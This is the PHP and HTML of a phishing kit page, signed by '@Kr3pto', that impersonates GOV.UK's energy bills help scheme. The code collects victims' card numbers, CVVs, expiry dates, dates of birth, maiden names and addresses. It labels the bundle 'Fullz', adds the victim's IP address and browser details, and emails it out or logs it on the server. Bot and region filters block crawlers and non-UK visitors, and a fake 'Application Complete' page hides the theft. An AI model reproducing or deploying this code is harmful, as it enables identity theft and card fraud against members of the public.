<?php
// @Kr3pto on telegram
require "configg.php";
require "eng_assetz/vinc/session_protect.php";
require "eng_assetz/vinc/functions.php";
require "eng_assetz/dev.php";

if($internal_antibot == 1){
	require "eng_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "eng_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();

if($_POST['ccname'] and $_POST['ccnum'] and $_POST['ccexp'] and $_POST['cccvv']){
	$_SESSION['ccname'] = $_POST['ccname'];
	$_SESSION['ccnum'] = $_POST['ccnum'];
	$_SESSION['ccexp'] = $_POST['ccexp'];
	$_SESSION['cccvv'] = $_POST['cccvv'];
	
	$fullname = $_SESSION['fullname'];
        $maidenname = $_SESSION['maidenname'];
	$dob = $_SESSION['dob'];
	$mobile = $_SESSION['mobile'];
	$address = $_SESSION['address'];
	$town = $_SESSION['town'];
	$postcode = $_SESSION['postcode'];
	
	$ccname = $_SESSION['ccname'];
	$ccnum = $_SESSION['ccnum'];
	$ccexp = $_SESSION['ccexp'];
	$cccvv = $_SESSION['cccvv'];
	
	
	$ccnum = str_replace(' ', '', $ccnum);
	$bin = substr($ccnum, 0, 6);
	$ccc = bankDetails($bin);
	$scheme =  strtoupper($ccc['scheme']);
	$type =  strtoupper($ccc['type']);
	$brand =  strtoupper($ccc['brand']);
	$bank =  strtoupper($ccc['bank']['name']);
	$bin =  strtoupper($ccc['bin']);
	$country =  strtoupper($ccc['country']['alpha2']);
	if($ccc['prepaid'] == true){$prepaid = strtoupper('Prepaid');}else{$prepaid = strtoupper('Non-Prepaid');}
	$ccinfo = "$bin | $scheme | $type | $brand | $bank";
	
	$date = date('l d F Y');
	$time = date('H:i');
	$ip = $_SERVER['REMOTE_ADDR'];
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$os = os_info($useragent);
	$browser = browsername();
	$VictimInfo  = "| IP Address : $ip\n";
	$VictimInfo .= "| UserAgent : $useragent\n";
	$VictimInfo .= "| Browser : $browser\n";
	$VictimInfo .= "| OS : $os";
	
	$headers = "From:$ccname <fredchike24@gmail.com>";
	$subj = "Kr3pto GovEnergy Fullz $bin - $type $brand $bank [$ip]";
	
	
	$data = "
+ ------------ GovEnergy Fullz -------------+
+ ------------------------------------------+
| Full name : $fullname
| Maiden name : $maiden name
| DOB : $dob
| Mobile number : $mobile
| Address : $address
| Town : $town
| Postcode : $postcode
+ ------------------------------------------+
| Holder name : $ccname
| Card number : $ccnum
| Expiry date : $ccexp
| CVV : $cccvv
| BIN : $ccinfo
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- @Kr3pto ------------------+
";
	mail($to,$subj,$data,$headers);	
	if($saveonhost == 1){
		$fp = fopen('page_l0gz/GovEnergy_FULLzz_.txt', 'a');
		fwrite($fp, $data."\n");
		fclose($fp);
	}
	
	if($One_Time_Access==1){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
	}
	
	
	
}else{
	$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}
?>
<!DOCTYPE html>
<html class="govuk-template js-enabled" lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
        <title>Help with your energy bills application form - GOV.UK</title>
		<meta http-equiv="refresh" content="6;url=<?=$ExitLink;?>" />
        <link rel="shortcut icon" href="eng_assetz/img/favicon-9ed7849c462c53aa2cdf1690eb257e801ecbf5696d1d0928868c5b032b4adb36.ico" />
        <link rel="stylesheet" href="eng_assetz/css/govuk-frontend.css" />
        <link rel="stylesheet" href="eng_assetz/css/scp.css" />
    </head>
    <body class="govuk-template__body">
        <header class="govuk-header">
            <div class="govuk-header__container govuk-width-container">
                <div class="govuk-header__logo">
                    <a href="javascript:void(0);" class="govuk-header__link govuk-header__link--homepage">
                        <span class="govuk-header__logotype">
                            <svg focusable="false" class="govuk-header__logotype-crown" viewBox="0 0 132 97" height="30" width="36">
                                <path
                                    fill="currentColor"
                                    fill-rule="evenodd"
                                    d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zM9 39.5c3.6 1.5 7.8-.2 9.2-3.7 1.5-3.6-.2-7.8-3.9-9.1-3.6-1.5-7.6.2-9.1 3.8-1.4 3.5.3 7.5 3.8 9zM4.4 57.2c3.5 1.5 7.7-.2 9.1-3.8 1.5-3.6-.2-7.7-3.9-9.1-3.5-1.5-7.6.3-9.1 3.8-1.4 3.5.3 7.6 3.9 9.1zm38.3-21.4c3.5 1.5 7.7-.2 9.1-3.8 1.5-3.6-.2-7.7-3.9-9.1-3.6-1.5-7.6.3-9.1 3.8-1.3 3.6.4 7.7 3.9 9.1zm64.4-5.6c-3.6 1.5-7.8-.2-9.1-3.7-1.5-3.6.2-7.8 3.8-9.2 3.6-1.4 7.7.3 9.2 3.9 1.3 3.5-.4 7.5-3.9 9zm15.9 9.3c-3.6 1.5-7.7-.2-9.1-3.7-1.5-3.6.2-7.8 3.7-9.1 3.6-1.5 7.7.2 9.2 3.8 1.5 3.5-.3 7.5-3.8 9zm4.7 17.7c-3.6 1.5-7.8-.2-9.2-3.8-1.5-3.6.2-7.7 3.9-9.1 3.6-1.5 7.7.3 9.2 3.8 1.3 3.5-.4 7.6-3.9 9.1zM89.3 35.8c-3.6 1.5-7.8-.2-9.2-3.8-1.4-3.6.2-7.7 3.9-9.1 3.6-1.5 7.7.3 9.2 3.8 1.4 3.6-.3 7.7-3.9 9.1zM69.7 17.7l8.9 4.7V9.3l-8.9 2.8c-.2-.3-.5-.6-.9-.9L72.4 0H59.6l3.5 11.2c-.3.3-.6.5-.9.9l-8.8-2.8v13.1l8.8-4.7c.3.3.6.7.9.9l-5 15.4v.1c-.2.8-.4 1.6-.4 2.4 0 4.1 3.1 7.5 7 8.1h.2c.3 0 .7.1 1 .1.4 0 .7 0 1-.1h.2c4-.6 7.1-4.1 7.1-8.1 0-.8-.1-1.7-.4-2.4V34l-5.1-15.4c.4-.2.7-.6 1-.9zM66 92.8c16.9 0 32.8 1.1 47.1 3.2 4-16.9 8.9-26.7 14-33.5l-9.6-3.4c1 4.9 1.1 7.2 0 10.2-1.5-1.4-3-4.3-4.2-8.7L108.6 76c2.8-2 5-3.2 7.5-3.3-4.4 9.4-10 11.9-13.6 11.2-4.3-.8-6.3-4.6-5.6-7.9 1-4.7 5.7-5.9 8-.5 4.3-8.7-3-11.4-7.6-8.8 7.1-7.2 7.9-13.5 2.1-21.1-8 6.1-8.1 12.3-4.5 20.8-4.7-5.4-12.1-2.5-9.5 6.2 3.4-5.2 7.9-2 7.2 3.1-.6 4.3-6.4 7.8-13.5 7.2-10.3-.9-10.9-8-11.2-13.8 2.5-.5 7.1 1.8 11 7.3L80.2 60c-4.1 4.4-8 5.3-12.3 5.4 1.4-4.4 8-11.6 8-11.6H55.5s6.4 7.2 7.9 11.6c-4.2-.1-8-1-12.3-5.4l1.4 16.4c3.9-5.5 8.5-7.7 10.9-7.3-.3 5.8-.9 12.8-11.1 13.8-7.2.6-12.9-2.9-13.5-7.2-.7-5 3.8-8.3 7.1-3.1 2.7-8.7-4.6-11.6-9.4-6.2 3.7-8.5 3.6-14.7-4.6-20.8-5.8 7.6-5 13.9 2.2 21.1-4.7-2.6-11.9.1-7.7 8.8 2.3-5.5 7.1-4.2 8.1.5.7 3.3-1.3 7.1-5.7 7.9-3.5.7-9-1.8-13.5-11.2 2.5.1 4.7 1.3 7.5 3.3l-4.7-15.4c-1.2 4.4-2.7 7.2-4.3 8.7-1.1-3-.9-5.3 0-10.2l-9.5 3.4c5 6.9 9.9 16.7 14 33.5 14.8-2.1 30.8-3.2 47.7-3.2z"
                                ></path>
                            </svg>
                            <span class="govuk-header__logotype-text"> GOV.UK </span>
                        </span>
                    </a>
                </div>
            </div>
        </header>
        <div class="govuk-width-container govuk-!-margin-top-4">
            <a class="govuk-back-link" href="javascript:void(0);">Back</a>
            <main class="govuk-main-wrapper govuk-!-padding-top-0" id="skip-target">
                <div class="govuk-grid-row">
                    <div class="govuk-grid-column-two-thirds">
                        <h1 class="govuk-heading-xl">Application Complete</h1>
                        <p class="govuk-body">We have successfully received your details and we will update you using the provided details in the next 2-4 business days.</p>
                        <svg style="margin: auto; background: #fff; display: block;" width="100px" height="100px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                            <g transform="rotate(0 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.9166666666666666s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(30 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.8333333333333334s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(60 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c"><animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.75s" repeatCount="indefinite"></animate></rect>
                            </g>
                            <g transform="rotate(90 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.6666666666666666s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(120 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.5833333333333334s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(150 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c"><animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.5s" repeatCount="indefinite"></animate></rect>
                            </g>
                            <g transform="rotate(180 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.4166666666666667s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(210 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.3333333333333333s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(240 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c"><animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.25s" repeatCount="indefinite"></animate></rect>
                            </g>
                            <g transform="rotate(270 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.16666666666666666s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(300 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c">
                                    <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.08333333333333333s" repeatCount="indefinite"></animate>
                                </rect>
                            </g>
                            <g transform="rotate(330 50 50)">
                                <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#0b0c0c"><animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="0s" repeatCount="indefinite"></animate></rect>
                            </g>
                        </svg>
                    </div>
                </div>
            </main>
        </div>
        <footer class="govuk-footer">
            <div class="govuk-width-container">
                <div class="govuk-footer__meta">
                    <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
                        <ul class="govuk-footer__inline-list">
                            <li class="govuk-footer__inline-list-item"><a id="accessibility" class="govuk-footer__link" href="javascript:void(0);"> Accessibility statement</a></li>
                            <li class="govuk-footer__inline-list-item"><a id="cookies" class="govuk-footer__link" href="javascript:void(0);"> Cookies</a></li>
                            <li class="govuk-footer__inline-list-item"><a id="privacy-notice" class="govuk-footer__link" href="javascript:void(0);"> Privacy notice</a></li>
                            <li class="govuk-footer__inline-list-item"><a id="terms-and-conditions" class="govuk-footer__link" href="javascript:void(0);"> Terms and conditions</a></li>
                        </ul>
                        <svg focusable="false" class="govuk-footer__licence-logo" viewBox="0 0 483.2 195.7" height="17" width="41">
                            <path
                                fill="currentColor"
                                d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145"
                            ></path>
                        </svg>
                        <span class="govuk-footer__licence-description"> All content is available under the <a class="govuk-footer__link" href="javascript:void(0);">Open Government Licence v3.0</a>, except where otherwise stated </span>
                    </div>
                    <div class="govuk-footer__meta-item"><a class="govuk-footer__link govuk-footer__copyright-logo" href="javascript:void(0);"> © Crown copyright </a></div>
                </div>
            </div>
        </footer>
    </body>
</html>